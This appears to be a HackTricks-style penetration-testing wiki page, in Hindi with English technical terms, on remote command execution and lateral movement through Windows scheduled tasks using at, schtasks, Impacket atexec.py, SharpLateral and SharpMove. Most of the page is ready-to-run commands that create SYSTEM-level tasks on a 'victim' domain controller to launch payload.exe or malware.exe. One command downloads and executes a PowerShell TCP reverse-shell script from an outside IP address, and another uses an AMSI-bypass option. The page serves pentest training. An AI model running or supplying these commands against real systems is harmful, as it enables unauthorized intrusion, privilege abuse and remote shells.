# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## यह कैसे काम करता है

Windows host पर administrative access होने पर, operator remotely scheduled task create और start कर सकता है। `/S` option remote host को select करता है, `/U` और `/P` जरूरत पड़ने पर task create करने के लिए credentials प्रदान करते हैं, और `/RU` उस account को select करता है जिसके अंतर्गत task चलता है। `/TR` द्वारा referenced command remote system पर मौजूद होनी चाहिए।<sup>[[1]](#references)</sup>

पुराना `at` command भी remote host पर command schedule कर सकता है, जब Schedule service चल रही हो। यह scheduled jobs को service account के अंतर्गत execute करता है, जो आमतौर पर `SYSTEM` होता है:<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
कार्य बनाएं और फिर उसे शुरू करें:
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
उदाहरण के लिए:
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
नियमित साप्ताहिक कार्य के लिए, एक मान्य weekly schedule का उपयोग करें और दिन को स्पष्ट रूप से निर्दिष्ट करें:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
एक task action सीधे PowerShell को भी invoke कर सकता है। निम्नलिखित lab example एक script को download करके run करता है; payload को केवल assessment के लिए authorized infrastructure पर host करें:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Impacket का `atexec.py` Task Scheduler service के माध्यम से remote command execution को automate करता है और password, NTLM-hash या Kerberos authentication स्वीकार करता है।<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral एक scheduled-task execution method प्रदान करता है:<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
SharpMove एक और Task Scheduler implementation प्रदान करता है:<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
[**silver tickets के साथ schtasks के उपयोग की अधिक जानकारी यहां**](../active-directory-methodology/silver-ticket.md#host)

उपयोग के बाद testing tasks हटाएं:
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - schtasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - `at` command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
